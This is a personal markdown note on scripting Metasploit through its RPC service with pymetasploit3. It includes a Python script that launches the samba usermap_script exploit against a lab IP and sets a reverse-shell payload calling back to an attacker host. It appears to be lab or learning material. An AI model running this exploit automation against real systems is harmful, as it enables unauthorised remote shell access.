---
title: Metasploit scripting and more
created: '2024-03-31T04:25:36.765Z'
modified: '2024-03-31T12:26:50.427Z'
---

# Metasploit scripting and more

[mad-metasploit](https://github.com/hahwul/mad-metasploit) custom metasploit scripts

---

[metasploit unleashed](https://www.offsec.com/metasploit-unleashed/)

[official metasploit documentation](https://docs.metasploit.com/)

---

metasploit has enabled ssl by default. http will not work.

install package:

```bash
pip3 install pymetasploit3
```

launch metasploit background rpc service:
```bash
# get help
msfrpcd -h
# start background service
msfrpcd -P lazero
# or if you want foreground service
msfrpcd -P lazero -f
```


run script:

```python
from pymetasploit3.msfrpc import MsfRpcClient
import os

PWD = "lazero"

custom_module_path = "custom_msf_module"
assert os.path.exists(custom_module_path), (
    "Custom module path not found at: '%s'" % custom_module_path
)

# write custom python modules with:
# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html


client = MsfRpcClient(
    password=PWD, ssl=True
)  # requires ssl by default. otherwise won't work

# the module structure must be identical to the one at , otherwise it will not load.
client.core.addmodulepath(os.path.abspath(custom_module_path))

exploit_id = "multi/samba/usermap_script"
exp_mod = client.modules.use("exploit", exploit_id)

RHOST = "172.16.194.172"
LHOST = "172.16.194.163"

exp_mod.runoptions["RHOST"] = RHOST  # this host is not running.
exp_mod.runoptions["PAYLOAD"] = "cmd/unix/reverse"
exp_mod.runoptions["LHOST"] = LHOST

msf_console = (
    client.consoles.console()
)  # you can manually read/write instead of using below method.
# timeout: 301 seconds.
exploit_run_output = msf_console.run_module_with_output(exp_mod)  # str
print(exploit_run_output)  # now have output. but still it is not streaming.
# you may want to overwrite the original implementation. the data is actually produced step by step.

run_output_file = "samba_usermap_script_output.log"
with open(run_output_file, "w+") as f:
    f.write(exploit_run_output)
print("[metasploit]", "output file saved at:", run_output_file)
# thank you very much.

```
